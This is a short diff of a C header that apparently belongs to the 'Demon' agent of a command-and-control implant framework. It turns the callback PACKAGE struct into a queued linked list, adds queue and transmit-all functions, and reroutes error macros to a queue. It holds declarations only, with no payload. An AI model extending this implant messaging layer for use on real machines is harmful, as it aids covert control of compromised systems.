@@ -3,17 +3,23 @@
 
 #include <Core/Command.h>
 
-typedef struct {
+#define DEMON_MAX_REQUEST_LENGTH 0x1e00000
+
+typedef struct _PACKAGE {
     UINT32  RequestID;
     UINT32  CommandID;
     PVOID   Buffer;
     SIZE_T  Length;
     BOOL    Encrypt;
     BOOL    Destroy; /* destroy this package after Transmit */
+    BOOL    Included;
+
+    struct  _PACKAGE* Next;
 } PACKAGE, *PPACKAGE;
 
 /* Package generator */
 PPACKAGE PackageCreate( UINT32 CommandID );
+PPACKAGE PackageCreateWithMetaData( UINT32 CommandID );
 PPACKAGE PackageCreateWithRequestID( UINT32 RequestID, UINT32 CommandID );
 
 /* PackageAddInt32
@@ -72,12 +78,23 @@ BOOL PackageTransmit(
     PSIZE_T  Size
 );
 
-VOID PackageTransmitError(
+// PackageQueue
+VOID PackageQueue(
+    IN PPACKAGE Package
+);
+
+// PackageQueue
+BOOL PackageTransmitAll(
+    PVOID*   Response,
+    PSIZE_T  Size
+);
+
+VOID PackageQueueError(
     UINT32 CommandID,
     UINT32 ErrorCode
 );
 
-#define PACKAGE_ERROR_WIN32         PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
-#define PACKAGE_ERROR_NTSTATUS( s ) PackageTransmitError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( s ) );
+#define PACKAGE_ERROR_WIN32         PackageQueueError( CALLBACK_ERROR_WIN32, NtGetLastError() );
+#define PACKAGE_ERROR_NTSTATUS( s ) PackageQueueError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( s ) );
 
 #endif
